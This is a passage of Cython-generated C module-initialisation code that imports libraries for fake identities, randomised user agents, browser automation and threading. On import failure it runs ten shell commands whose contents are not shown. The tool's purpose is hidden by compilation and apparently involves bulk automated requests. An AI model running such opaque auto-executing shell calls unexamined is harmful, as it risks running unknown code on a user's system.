  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Thread, __pyx_t_2) < 0) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_threading, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_threading, __pyx_t_1) < 0) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_1) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_json, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_json, __pyx_t_1) < 0) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_generate_user_agent);
  __Pyx_GIVEREF(__pyx_n_s_generate_user_agent);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_generate_user_agent);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_user_agent_2, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_generate_user_agent, __pyx_t_1) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 44, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_uuid4);
  __Pyx_GIVEREF(__pyx_n_s_uuid4);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_uuid4);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_uuid, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 44, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 44, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_uuid4, __pyx_t_2) < 0) __PYX_ERR(0, 44, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_random, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_random, __pyx_t_1) < 0) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_mechanize, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_mechanize, __pyx_t_1) < 0) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_uuid, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_uuid, __pyx_t_1) < 0) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_threading, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_threading, __pyx_t_1) < 0) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_time, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_1) < 0) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 50, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_Faker);
  __Pyx_GIVEREF(__pyx_n_s_Faker);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_Faker);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_faker, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 50, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_Faker); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 50, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Faker, __pyx_t_1) < 0) __PYX_ERR(0, 50, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_sleep);
  __Pyx_GIVEREF(__pyx_n_s_sleep);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_sleep);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_time, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_sleep); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sleep, __pyx_t_2) < 0) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 52, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_1) < 0) __PYX_ERR(0, 52, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_faker, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 53, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_faker, __pyx_t_1) < 0) __PYX_ERR(0, 53, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_user_agent_2, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 54, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_user_agent_2, __pyx_t_1) < 0) __PYX_ERR(0, 54, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_random, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 55, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_random, __pyx_t_1) < 0) __PYX_ERR(0, 55, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_threading, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 56, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_threading, __pyx_t_1) < 0) __PYX_ERR(0, 56, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_ThreadPoolExecutor);
  __Pyx_GIVEREF(__pyx_n_s_ThreadPoolExecutor);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_ThreadPoolExecutor);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_concurrent_futures, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ThreadPoolExecutor, __pyx_t_1) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 59, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_generate_user_agent);
  __Pyx_GIVEREF(__pyx_n_s_generate_user_agent);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_generate_user_agent);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_user_agent_2, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 59, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 59, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_generate_user_agent, __pyx_t_2) < 0) __PYX_ERR(0, 59, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_Faker);
  __Pyx_GIVEREF(__pyx_n_s_Faker);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_Faker);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_faker, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_Faker); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Faker, __pyx_t_1) < 0) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_time);
  __Pyx_GIVEREF(__pyx_n_s_time);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_time);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_time, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_time); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_2) < 0) __PYX_ERR(0, 61, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_md5);
  __Pyx_GIVEREF(__pyx_n_s_md5);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_md5);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_hashlib, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_md5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_md5, __pyx_t_1) < 0) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_e, __pyx_int_0) < 0) __PYX_ERR(0, 63, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_e, __pyx_int_0) < 0) __PYX_ERR(0, 64, __pyx_L1_error)

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_4, &__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
    /*try:*/ {

      
      __pyx_t_2 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 66, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_2);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_2) < 0) __PYX_ERR(0, 66, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
      __pyx_t_2 = __Pyx_Import(__pyx_n_s_colorama, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 67, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_2);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_colorama, __pyx_t_2) < 0) __PYX_ERR(0, 67, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
      __pyx_t_2 = __Pyx_Import(__pyx_n_s_prettytable, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 68, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_2);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_prettytable, __pyx_t_2) < 0) __PYX_ERR(0, 68, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
      __pyx_t_2 = __Pyx_Import(__pyx_n_s_webbrowser, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 69, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_2);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_webbrowser, __pyx_t_2) < 0) __PYX_ERR(0, 69, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L7_try_end;
    __pyx_L2_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_6) {
      __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_1, &__pyx_t_7) < 0) __PYX_ERR(0, 70, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_7);

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 71, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 71, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__37, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 71, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 72, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 72, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__38, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 72, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 73, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 73, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__39, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 73, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 74, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 74, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__40, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 74, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 75, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 75, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__41, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 75, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 76, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 76, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 76, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 77, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 77, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__43, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 77, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 78, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 78, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__44, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 78, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 79, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 79, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__45, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 79, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 80, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 80, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__46, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 80, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      goto __pyx_L3_exception_handled;
    }
    goto __pyx_L4_except_error;
    __pyx_L4_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    goto __pyx_L1_error;
    __pyx_L3_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    __pyx_L7_try_end:;
  }

  
